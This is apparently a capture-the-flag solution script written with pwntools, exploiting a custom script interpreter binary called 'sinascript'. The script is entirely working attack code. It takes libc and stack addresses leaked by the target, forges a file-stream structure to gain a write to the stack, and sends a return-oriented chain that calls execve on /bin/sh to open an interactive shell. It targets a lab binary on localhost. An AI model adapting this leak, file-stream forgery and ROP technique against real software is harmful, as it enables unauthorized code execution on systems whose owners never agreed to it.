from pwn import *
import base64

context.update(os="linux", arch="amd64")
elf = context.binary = ELF("sinascript")
libc = ELF("libc.so.6")

EXPLOIT_FILE = "exploit.ss"

with open(EXPLOIT_FILE, "rb") as f:
	ss_exploit = f.read()

if args.REMOTE:
	p = remote("127.0.0.1", 5000)
	p.sendlineafter(b"input: ", base64.b64encode(ss_exploit))
else:
	if args.GDB:
		p = gdb.debug(["./sinascript", EXPLOIT_FILE])
		pause()
	else:
		p = elf.process([EXPLOIT_FILE])
		# gdb.attach(p)
		# pause()

p.recvuntil(b"libcLeak: ")
libc.address = int(p.recvline())
log.success("libc base = " + hex(libc.address))
p.recvuntil(b"stackLeak: ")
stack_leak = int(p.recvline())
log.success("stack argv strings @ " + hex(stack_leak))

rop_end = stack_leak & ~0xf
rop_begin = rop_end - 0x4000

fsop = p64(0xfbad208b) + p64(libc.address)
fsop += p64(0) * 5
fsop += p64(rop_begin) + p64(rop_end)
p.sendafter(b"1234", fsop)

ropper = ROP(libc)
ret_gadget = ropper.find_gadget(["ret"]).address
syscall_gadget = ropper.find_gadget(["syscall"]).address
pop_rdi = ropper.find_gadget(["pop rdi", "ret"]).address
pop_rsi = ropper.find_gadget(["pop rsi", "ret"]).address
pop_rax = ropper.find_gadget(["pop rax", "ret"]).address
xor_edx = libc.address + 0x16e953	# xor edx, edx ; mov rax, rdx ; ret

rop1 = p64(pop_rdi) + p64(next(libc.search(b"/bin/sh\0")))
rop1 += p64(pop_rsi) + p64(0)
rop1 += p64(xor_edx)
rop1 += p64(pop_rax) + p64(59)
rop1 += p64(syscall_gadget)
while len(rop1) < rop_end - rop_begin:
	rop1 = p64(ret_gadget) + rop1

p.sendafter(b"1234", rop1)

p.interactive()
